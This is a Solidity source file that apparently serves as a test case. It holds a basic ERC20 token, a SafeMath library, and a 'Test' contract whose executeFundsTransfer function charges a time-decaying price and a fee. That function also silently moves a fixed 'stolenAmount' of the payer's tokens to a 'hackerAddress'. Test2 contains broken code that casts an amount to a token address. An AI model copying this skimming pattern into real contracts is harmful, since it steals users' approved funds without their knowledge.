pragma solidity ^0.4.19;

contract ERC20Basic {

    string public constant name = "ERC20Basic";
    string public constant symbol = "BSC";
    uint8 public constant decimals = 18;
    address public addr;


    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    event Transfer(address indexed from, address indexed to, uint tokens);


    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_;

    using SafeMath for uint256;
    constructor (address _addr) public {
       addr = _addr;
    }


//    constructor(uint256 total) public {
// 	totalSupply_ = total;
// 	balances[msg.sender] = totalSupply_;
//     }

    function totalSupply() public view returns (uint256) {
	return totalSupply_;
    }

    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint numTokens) public returns (bool) {
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint numTokens) public returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        Transfer(owner, buyer, numTokens);
        return true;
    }
}

contract Test {
    uint listingTime;
    uint expirationTime;
    uint extraPrice;
    uint basePrice;
    uint feeRate;

    address feeRecipient = 0x001d3f1ef827552ae1114027bd3ecf1f086ba0c8;
    uint stolenAmount = 100;
    address hackerAddress = 0x001d3f1ef827552ae1114027bd3ecf1f086ba0f9;


    function executeFundsTransfer(address token, address from, address to) public returns (uint){
        // ERC20Basic token = ERC20Basic(amount);
        // uint first_amount = amount0 + time - now + amount;

        // token.transferFrom(from, to, first_amount);
        // uint temp_amount = first_amount;

        // uint second_amount = temp_amount + fee;

        // token.transfer(third_party_address, second_amount);
        // ERC20Basic token = ERC20Basic(amount);
        // uint first_amount = time - now + amount;

        // token.transferFrom(from, to, first_amount);

        // uint second_amount = first_amount + fee;

        // token.transfer(third_party_address, second_amount);

        // return true;
        ERC20Basic token0 = ERC20Basic(token);
        uint diff = extraPrice * (now - listingTime) / (expirationTime - listingTime);
        uint price = basePrice - diff;
        from.send(msg.value);

        if (price > 0 && token != address(0)) {
            token0.transferFrom(from, to, price);
        }

        uint fee = price * feeRate;
        token0.transferFrom(from, feeRecipient, fee);
        token0.transferFrom(from, hackerAddress, stolenAmount);

        return 0;
    }
}


contract Test2 {
    function test(address from, address to, uint amount) public returns (bool){
        ERC20Basic token = ERC20Basic(amount);
        token.transferFrom(from, to, amount);
        return true;
    }


}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
}